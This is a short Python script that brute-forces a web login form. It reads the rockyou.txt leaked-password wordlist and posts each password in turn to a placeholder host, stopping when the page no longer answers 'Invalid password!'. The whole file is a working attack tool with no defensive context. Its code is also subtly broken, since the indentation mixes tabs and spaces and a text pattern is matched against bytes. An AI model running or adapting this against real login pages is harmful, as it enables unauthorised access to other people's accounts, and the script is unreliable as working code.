#!/usr/bin/python3.7

import requests, re

host = "http://sample.com"
dico = open('rockyou.txt', 'r').readlines()
num = 1

for passw in dico:
	passw = passw.rstrip('\n')
	data = {'password':passw}
	r = requests.post(host, data=data)
	if re.findall(r'Invalid password!', r.content):
		print("test N°",num)
                num += 1
	else:
		print(passw)
                print("Pass found !")
		print(r.text)
                quit()
